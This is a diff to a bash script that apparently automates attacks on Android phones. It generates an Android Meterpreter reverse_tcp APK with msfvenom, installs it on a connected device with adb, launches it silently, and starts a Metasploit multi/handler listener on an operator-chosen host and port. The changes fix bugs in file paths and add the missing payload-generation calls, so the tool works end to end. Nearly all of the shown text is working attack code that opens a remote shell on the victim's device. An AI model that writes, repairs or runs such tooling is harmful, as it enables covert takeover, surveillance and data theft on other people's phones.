@@ -85,8 +85,8 @@ name_taker () {
 
 payload_creator () {
 
-        msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost1 LPORT=$lport1 R> metasploit/$name.apk 2> /dev/null | echo -e "\n\e[1;5;92mGENERATING PAYLOAD WAIT A MOMENT.\e[0m"
-        echo -e "\n\e[1;93mThe payload was saved inside $PWD/metasploit/$name_apk.apk\e[0m]"
+        msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost1 LPORT=$lport1 R> metasploit/$name_apk.apk 2> /dev/null | echo -e "\n\e[1;5;92mGENERATING PAYLOAD WAIT A MOMENT.\e[0m"
+        echo -e "\n\e[1;93mThe payload was saved inside $PWD/metasploit/$name_apk.apk\e[0m"
         to_install=0
 
 }
@@ -94,24 +94,22 @@ payload_creator () {
 apk_install () {
 
         echo -e "\e[1;92mINSTALLING THE PAYLOAD\n"
-        if [ "$to_install" == "0" ]
+        adb -s $devv install -r metasploit/$name_apk.apk
+        if [ "$?" == "0" ]
             then
-                adb -s $devv install -r $PWD/metasploit/$name_taker.apk &> /dev/null
-                if [ "$?" == "0" ]
-                    then
-                        echo -e "\n\e[1;92mSuccessfully installed the 'apk' into device $modd\n"
-                    else
-                        echo -e "\n\e[1;91mFailed installing the 'apk' into device $modd\n"
-                fi
+                echo -e "\n\e[1;92mSuccessfully installed the 'apk' into device $modd\n"
+            else
+                echo -e "\n\e[1;91mFailed installing the 'apk' into device $modd\n"
         fi
 }
 
 start_listner () {
 
+     adb -s $devv shell monkey -p com.metasploit.stage -c android.intent.category.LAUNCHER 1 >/dev/null 2>&1 | echo -e "\e[1;93mLaunching the PAYLOAD.\e[0m"; echo -e "\n\e[1;92mDone\n"
      echo -e "\e[1;92mStarting the MSF listner\n"
      time=$(date +"%T")
      echo -e "use exploit/multi/handler\nset PAYLOAD android/meterpreter/reverse_tcp\nset LHOST $lhost1\nset LPORT $lport1\nexploit" > $PWD/metasploit/.exploit-$time.rc
-     msfconsole -q -r $PWD/metasploit/.exploit$-time.rc
+     msfconsole -q -r $PWD/metasploit/.exploit-$time.rc
 
 }
 
@@ -123,6 +121,7 @@ dev_1_payload_create () {
                 lhost_taker
                 lport_taker
                 name_taker
+                payload_creator
                 while true; do
                   read -p $'\e[93;1mDo you want to install the PAYLOAD in the device.\e[1;97m (Y/n) \e[91;1m? : \e[1;93m' yn
                   case $yn in
@@ -148,6 +147,7 @@ dev_2_payload_create () {
                 lhost_taker
                 lport_taker
                 name_taker
+                payload_creator
                 while true; do
                   read -p $'\e[93;1mDo you want to install the PAYLOAD in the device.\e[1;97m (Y/n) \e[91;1m? : \e[1;93m' yn
                   case $yn in
@@ -173,6 +173,7 @@ dev_3_payload_create () {
                 lhost_taker
                 lport_taker
                 name_taker
+                payload_creator
                 while true; do
                   read -p $'\e[93;1mDo you want to install the PAYLOAD in the device.\e[1;97m (Y/n) \e[91;1m? : \e[1;93m' yn
                   case $yn in
